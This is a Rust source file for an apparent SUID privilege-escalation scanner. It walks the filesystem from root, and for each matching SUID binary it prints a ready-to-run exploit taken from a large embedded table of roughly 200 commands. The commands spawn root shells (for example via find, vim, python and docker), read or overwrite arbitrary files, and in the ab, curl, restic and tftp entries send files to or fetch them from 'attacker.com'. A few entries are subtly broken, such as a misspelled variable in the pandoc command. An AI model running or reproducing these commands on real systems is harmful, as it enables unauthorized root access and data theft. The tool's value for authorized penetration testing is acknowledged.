use colored::Colorize;
use jwalk::WalkDir;
use chrono::Local;
use std::collections::HashMap;
use std::fs;
use std::os::unix::fs::MetadataExt;
use std::path::Path;
use std::time::Instant;

fn banner() {
    println!("");
    println!(
        "{}",
        format!(
            "{}{}",
            "            _     _".blue().bold(),
            "      _     _  ".purple().bold()
        )
    );
    println!(
        "{}",
        format!(
            "{}{}",
            "  ___ _   _(_) __| |".blue().bold(),
            " ___| |__ | | __".purple().bold()
        )
    );
    println!(
        "{}",
        format!(
            "{}{}",
            " / __| | | | |/ _` |".blue().bold(),
            "/ __| '_ \\| |/ /".purple().bold()
        )
    );
    println!(
        "{}",
        format!(
            "{}{}",
            " \\__ \\ |_| | | (_| |".blue().bold(),
            " (__| | | |   <".purple().bold()
        )
    );
    println!(
        "{}",
        format!(
            "{}{}",
            " |___/\\__,_|_|\\__,_|".blue().bold(),
            "\\___|_| |_|_|\\_\\".purple().bold(),
        )
    );
    println!(
        "{}",
        format!(
            "{}{}{}{}",
            "          [Created by ".green().bold(),
            "Drake ".purple().bold(),
            "Axelrod".blue().bold(),
            "]".green().bold(),
        )
    );
    println!("");
}

fn remove_surrounding_quotes(s: &str) -> &str {
    s.strip_prefix('\'')
        .and_then(|s| s.strip_suffix('\''))
        .unwrap_or(s)
}

fn vulnerable_suids(path: &str) {
    let suids: HashMap<&str, &str> = HashMap::from([
    ("aa-exec", "'./aa-exec /bin/sh -p'"),
    ("ab", "'URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL'"),
    ("agetty", "'./agetty -o -p -l /bin/sh -a root tty'"),
    ("alpine", "'LFILE=file_to_read\n./alpine -F \"$LFILE\"'"),
    ("ar", "'TF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"'"),
    ("arj", "'TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR'"),
    ("arp", "'LFILE=file_to_read\n./arp -v -f \"$LFILE\"'"),
    ("as", "'LFILE=file_to_read\n./as @$LFILE'"),
    ("ascii-xfr", "'LFILE=file_to_read\n./ascii-xfr -ns \"$LFILE\"'"),
    ("ash", "'./ash'"),
    ("aspell", "'LFILE=file_to_read\n./aspell -c \"$LFILE\"'"),
    ("atobm", "'LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"\'\" \'{printf \"%s\", $2}\''"),
    ("awk", "'LFILE=file_to_read\n./awk \'//\' \"$LFILE\"'"),
    ("base32", "'LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode'"),
    ("base64", "'LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode'"),
    ("basenc", "'LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64'"),
    ("basez", "'LFILE=file_to_read\n./basez \"$LFILE\" | basez --decode'"),
    ("bash", "'./bash -p'"),
    ("bc", "'LFILE=file_to_read\n./bc -s $LFILE\nquit'"),
    ("bridge", "'LFILE=file_to_read\n./bridge -b \"$LFILE\"'"),
    ("busctl", "\"./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'\""),
    ("busybox", "'./busybox sh'"),
    ("bzip2", "'LFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d'"),
    ("cabal", "'./cabal exec -- /bin/sh -p'"),
    ("capsh", "'./capsh --gid=0 --uid=0 --'"),
    ("cat", "'LFILE=file_to_read\n./cat \"$LFILE\"'"),
    ("chmod", "'LFILE=file_to_change\n./chmod 6777 $LFILE'"),
    ("choom", "'./choom -n 0 -- /bin/sh -p'"),
    ("chown", "'LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE'"),
    ("chroot", "'./chroot / /bin/sh -p'"),
    ("clamscan", "\"LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\""),
    ("cmp", "'LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l'"),
    ("column", "'LFILE=file_to_read\n./column $LFILE'"),
    ("comm", "'LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null'"),
    ("cp", "'LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"'"),
    ("cpio", "'LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"'"),
    ("cpulimit", "'./cpulimit -l 100 -f -- /bin/sh -p'"),
    ("csh", "'./csh -b'"),
    ("csplit", "'LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01'"),
    ("csvtool", "'LFILE=file_to_read\n./csvtool trim t $LFILE'"),
    ("cupsfilter", "'LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE'"),
    ("curl", "'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE'"),
    ("cut", "'LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"'"),
    ("dash", "'./dash -p'"),
    ("date", "'LFILE=file_to_read\n./date -f $LFILE'"),
    ("dd", "'LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE'"),
    ("debugfs", "'./debugfs\n!/bin/sh'"),
    ("dialog", "'LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0'"),
    ("diff", "'LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE'"),
    ("dig", "'LFILE=file_to_read\n./dig -f $LFILE'"),
    ("distcc", "'./distcc /bin/sh -p'"),
    ("dmsetup", "\"./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\""),
    ("docker", "'./docker run -v /:/mnt --rm -it alpine chroot /mnt sh'"),
    ("dosbox", "'LFILE=\'\\path\\to\\file_to_write\'\n./dosbox -c \'mount c /\' -c \"echo DATA >c:$LFILE\" -c exit'"),
    ("ed", "'./ed file_to_read\n,p\nq'"),
    ("efax", "'LFILE=file_to_read\n./efax -d \"$LFILE\"'"),
    ("elvish", "'./elvish'"),
    ("emacs", "'./emacs -Q -nw --eval \'(term \"/bin/sh -p\")\''"),
    ("env", "'./env /bin/sh -p'"),
    ("eqn", "'LFILE=file_to_read\n./eqn \"$LFILE\"'"),
    ("espeak", "'LFILE=file_to_read\n./espeak -qXf \"$LFILE\"'"),
    ("expand", "'LFILE=file_to_read\n./expand \"$LFILE\"'"),
    ("expect", "\"./expect -c 'spawn /bin/sh -p;interact'\""),
    ("file", "'LFILE=file_to_read\n./file -f $LFILE'"),
    ("find", "'./find . -exec /bin/sh -p \\; -quit'"),
    ("fish", "'./fish'"),
    ("flock", "'./flock -u / /bin/sh -p'"),
    ("fmt", "'LFILE=file_to_read\n./fmt -999 \"$LFILE\"'"),
    ("fold", "'LFILE=file_to_read\n./fold -w99999999 \"$LFILE\"'"),
    ("gawk", "'LFILE=file_to_read\n./gawk \'//\' \"$LFILE\"'"),
    ("gcore", "'./gcore $PID'"),
    ("gdb", "'./gdb -nx -ex \'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")\' -ex quit'"),
    ("genie", "\"./genie -c '/bin/sh'\""),
    ("genisoimage", "'LFILE=file_to_read\n./genisoimage -sort \"$LFILE\"'"),
    ("gimp", "'./gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")\''"),
    ("grep", "\"LFILE=file_to_read\n./grep '' $LFILE\""),
    ("gtester", "\"TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\""),
    ("gzip", "'LFILE=file_to_read\n./gzip -f $LFILE -t'"),
    ("hd", "'LFILE=file_to_read\n./hd \"$LFILE\"'"),
    ("head", "'LFILE=file_to_read\n./head -c1G \"$LFILE\"'"),
    ("hexdump", "'LFILE=file_to_read\n./hexdump -C \"$LFILE\"'"),
    ("highlight", "'LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"'"),
    ("hping3", "'./hping3\n/bin/sh -p'"),
    ("iconv", "'LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"'"),
    ("install", "'LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF'"),
    ("ionice", "'./ionice /bin/sh -p'"),
    ("ip", "'LFILE=file_to_read\n./ip -force -batch \"$LFILE\"'"),
    ("ispell", "'./ispell /etc/passwd\n!/bin/sh -p'"),
    ("jjs", "'echo \"Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\').waitFor()\" | ./jjs'"),
    ("join", "'LFILE=file_to_read\n./join -a 2 /dev/null $LFILE'"),
    ("jq", "'LFILE=file_to_read\n./jq -Rr . \"$LFILE\"'"),
    ("jrunscript", "'./jrunscript -e \"exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')\"'"),
    ("julia", "\"./julia -e 'run(`/bin/sh -p`)'\""),
    ("ksh", "'./ksh -p'"),
    ("ksshell", "'LFILE=file_to_read\n./ksshell -i $LFILE'"),
    ("kubectl", "'LFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/'"),
    ("ld.so", "'./ld.so /bin/sh -p'"),
    ("less", "'./less file_to_read'"),
    ("links", "'LFILE=file_to_read\n./links \"$LFILE\"'"),
    ("logsave", "'./logsave /dev/null /bin/sh -i -p'"),
    ("look", "'LFILE=file_to_read\n./look \'\' \"$LFILE\"'"),
    ("lua", "'lua -e \'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);\''"),
    ("make", "'COMMAND=\'/bin/sh -p\'\n./make -s --eval=$\'x:\\n\\t-\'\"$COMMAND\"'"),
    ("mawk", "'LFILE=file_to_read\n./mawk \'//\' \"$LFILE\"'"),
    ("minicom", "'./minicom -D /dev/null'"),
    ("more", "'./more file_to_read'"),
    ("mosquitto", "'LFILE=file_to_read\n./mosquitto -c \"$LFILE\"'"),
    ("msgattrib", "'LFILE=file_to_read\n./msgattrib -P $LFILE'"),
    ("msgcat", "'LFILE=file_to_read\n./msgcat -P $LFILE'"),
    ("msgconv", "'LFILE=file_to_read\n./msgconv -P $LFILE'"),
    ("msgfilter", "\"echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'\""),
    ("msgmerge", "'LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null'"),
    ("msguniq", "'LFILE=file_to_read\n./msguniq -P $LFILE'"),
    ("multitime", "'./multitime /bin/sh -p'"),
    ("mv", "'LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE'"),
    ("nasm", "'LFILE=file_to_read\n./nasm -@ $LFILE'"),
    ("nawk", "'LFILE=file_to_read\n./nawk \'//\' \"$LFILE\"'"),
    ("ncftp", "'./ncftp\n!/bin/sh -p'"),
    ("nft", "'LFILE=file_to_read\n./nft -f \"$LFILE\"'"),
    ("nice", "'./nice /bin/sh -p'"),
    ("nl", "\"LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\""),
    ("nm", "'LFILE=file_to_read\n./nm @$LFILE'"),
    ("nmap", "'LFILE=file_to_write\n./nmap -oG=$LFILE DATA'"),
    ("node", "'./node -e \'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})\''"),
    ("nohup", "'./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\"'"),
    ("ntpdate", "'LFILE=file_to_read\n./ntpdate -a x -k $LFILE -d localhost'"),
    ("od", "'LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"'"),
    ("openssl", "'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n'"),
    ("openvpn", "'./openvpn --dev null --script-security 2 --up \'/bin/sh -p -c \"sh -p\"\''"),
    ("pandoc", "'LFILE=file_to_write\necho DATA | ./pandoc -t plain -o \"$LFIL\"'"),
    ("paste", "'LFILE=file_to_read\npaste $LFILE'"),
    ("perf", "'./perf stat /bin/sh -p'"),
    ("perl", "'./perl -e \'exec \"/bin/sh\";\''"),
    ("pexec", "'./pexec /bin/sh -p'"),
    ("pg", "'./pg file_to_read'"),
    ("php", "'CMD=\"/bin/sh\"\n./php -r \"pcntl_exec(\'/bin/sh\', [\'-p\']);\"'"),
    ("pidstat", "'COMMAND=id\n./pidstat -e $COMMAND'"),
    ("pr", "'LFILE=file_to_read\npr -T $LFILE'"),
    ("ptx", "'LFILE=file_to_read\n./ptx -w 5000 \"$LFILE\"'"),
    ("python", "'./python -c \'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")\''"),
    ("rc", "\"./rc -c '/bin/sh -p'\""),
    ("readelf", "'LFILE=file_to_read\n./readelf -a @$LFILE'"),
    ("restic", "'RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"'"),
    ("rev", "'LFILE=file_to_read\n./rev $LFILE | rev'"),
    ("rlwrap", "'./rlwrap -H /dev/null /bin/sh -p'"),
    ("rsync", "'./rsync -e \'sh -p -c \"sh 0<&2 1>&2\"\' 127.0.0.1:/dev/null'"),
    ("rtorrent", "'echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\n./rtorrent'"),
    ("run-parts", "\"./run-parts --new-session --regex '^sh$' /bin --arg='-p'\""),
    ("rview", "'./rview -c \':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")\''"),
    ("rvim", "'./rvim -c \':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")\''"),
    ("sash", "'./sash'"),
    ("scanmem", "'./scanmem\nshell /bin/sh'"),
    ("sed", "'LFILE=file_to_read\n./sed -e \'\' \"$LFILE\"'"),
    ("setarch", "'./setarch $(arch) /bin/sh -p'"),
    ("setfacl", "'LFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE'"),
    ("setlock", "'./setlock - /bin/sh -p'"),
    ("shuf", "'LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"'"),
    ("soelim", "'LFILE=file_to_read\n./soelim \"$LFILE\"'"),
    ("softlimit", "'./softlimit /bin/sh -p'"),
    ("sort", "'LFILE=file_to_read\n./sort -m \"$LFILE\"'"),
    ("sqlite3", "'LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF'"),
    ("ss", "'LFILE=file_to_read\n./ss -a -F $LFILE'"),
    ("ssh-agent", "'./ssh-agent /bin/ -p'"),
    ("ssh-keygen", "'./ssh-keygen -D ./lib.so'"),
    ("ssh-keyscan", "'LFILE=file_to_read\n./ssh-keyscan -f $LFILE'"),
    ("sshpass", "'./sshpass /bin/sh -p'"),
    ("start-stop-daemon", "'./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p'"),
    ("stdbuf", "'./stdbuf -i0 /bin/sh -p'"),
    ("strace", "'./strace -o /dev/null /bin/sh -p'"),
    ("strings", "'LFILE=file_to_read\n./strings \"$LFILE\"'"),
    ("sysctl", "'COMMAND=\'/bin/sh -c id>/tmp/id\'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id'"),
    ("systemctl", "'TF=$(mktemp).service\necho \'[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target\' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF'"),
    ("tac", "'LFILE=file_to_read\n./tac -s \'RANDOM\' \"$LFILE\"'"),
    ("tail", "'LFILE=file_to_read\n./tail -c1G \"$LFILE\"'"),
    ("taskset", "'./taskset 1 /bin/sh -p'"),
    ("tbl", "'LFILE=file_to_read\n./tbl $LFILE'"),
    ("tclsh", "'./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr'"),
    ("tee", "'LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"'"),
    ("terraform", "'./terraform console\nfile(\"file_to_read\")'"),
    ("tftp", "'RHOST=attacker.com\n./tftp $RHOST\nput file_to_send'"),
    ("tic", "'LFILE=file_to_read\n./tic -C \"$LFILE\"'"),
    ("time", "'./time /bin/sh -p'"),
    ("timeout", "'./timeout 7d /bin/sh -p'"),
    ("troff", "'LFILE=file_to_read\n./troff $LFILE'"),
    ("ul", "'LFILE=file_to_read\n./ul \"$LFILE\"'"),
    ("unexpand", "'LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"'"),
    ("uniq", "'LFILE=file_to_read\n./uniq \"$LFILE\"'"),
    ("unshare", "'./unshare -r /bin/sh'"),
    ("unsquashfs", "'./unsquashfs shell\n./squashfs-root/sh -p'"),
    ("unzip", "'./unzip -K shell.zip\n./sh -p'"),
    ("update-alternatives", "'LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0'"),
    ("uudecode", "'LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode'"),
    ("uuencode", "'LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode'"),
    ("vagrant", "'cd $(mktemp -d)\necho \'exec \"/bin/sh -p\"\' > Vagrantfile\nvagrant up'"),
    ("varnishncsa", "'LFILE=file_to_write\n./varnishncsa -g request -q \'ReqURL ~ \"/xxx\"\' -F \'%{yyy}i\' -w \"$LFILE\"'"),
    ("view", "'./view -c \':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")\''"),
    ("vigr", "'./vigr'"),
    ("vim", "'./vim -c \':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")\''"),
    ("vimdiff", "'./vimdiff -c \':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")\''"),
    ("vipw", "'./vipw'"),
    ("w3m", "'LFILE=file_to_read\n./w3m \"$LFILE\" -dump'"),
    ("watch", "\"./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'\""),
    ("wc", "'LFILE=file_to_read\n./wc --files0-from \"$LFILE\"'"),
    ("wget", "\"TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF\n./wget --use-askpass=$TF 0\""),
    ("whiptail", "'LFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0'"),
    ("xargs", "'./xargs -a /dev/null sh -p'"),
    ("xdotool", "'./xdotool exec --sync /bin/sh -p'"),
    ("xmodmap", "'LFILE=file_to_read\n./xmodmap -v $LFILE'"),
    ("xmore", "'LFILE=file_to_read\n./xmore $LFILE'"),
    ("xxd", "'LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r'"),
    ("xz", "'LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d'"),
    ("yash", "'./yash'"),
    ("zsh", "'./zsh'"),
    ("zsoelim", "'LFILE=file_to_read\n./zsoelim \"$LFILE\"'"),
  ]);

    // Get the filename from the provided path
    let file_name = Path::new(path).file_name().and_then(|name| name.to_str());

    // If the file exists and matches a key in the hashmap, print the exploit
    if let Some(file_name) = file_name {
        if let Some(exploit) = suids.get(file_name) {
            // println!("Vulnerable SUID found: {}\nExploit: {}", path, exploit);
            println!("[{}] {}", "VULNERABLE".purple(), path);
            // println!("[{}]", "exploit".green());
            println!("");
            println!("{}", remove_surrounding_quotes(exploit).green());
            println!("");
        } else {
            println!("[{}] {}", "FOUND".blue(), path);
            // println!("No known exploit for SUID: {}", file_name);
        }
    } else {
        println!("[{}] Invalid file path: {}", "ERROR".red(), path);
    }
}

fn check_suid<P: AsRef<Path>>(path: P) {
    if let Ok(metadata) = fs::metadata(&path) {
        if metadata.is_file() && metadata.mode() & 0o4000 != 0 {
            if let Some(path_str) = path.as_ref().to_str() {
                // println!("[{}] {}", "found".blue(), path_str);
                vulnerable_suids(path_str)
            } else {
                println!(
                    "[{}] Invalid UTF-8 sequence in path: {:?}",
                    "ERROR".red(),
                    path.as_ref()
                );
            }
        }
    }
}

fn search() {
    let start_dir = "/";

    let result = WalkDir::new(start_dir).into_iter().filter_map(Result::ok);
    for entry in result {
        check_suid(entry.path());
    }
}

fn main() {
    banner();
    let start = Instant::now();
    let start_time = Local::now();
    println!("[{}] Started on {}", "INFO".green(), start_time);
    search();
    let end_time = Local::now();
    let duration = start.elapsed();
    println!("[{}] Ended on {}", "INFO".green(), end_time);
    let d = format!("{:.2?}", duration);
    println!(
        "[{}] Total execution time {}",
        "INFO".green(),
        d.yellow()
    );
}
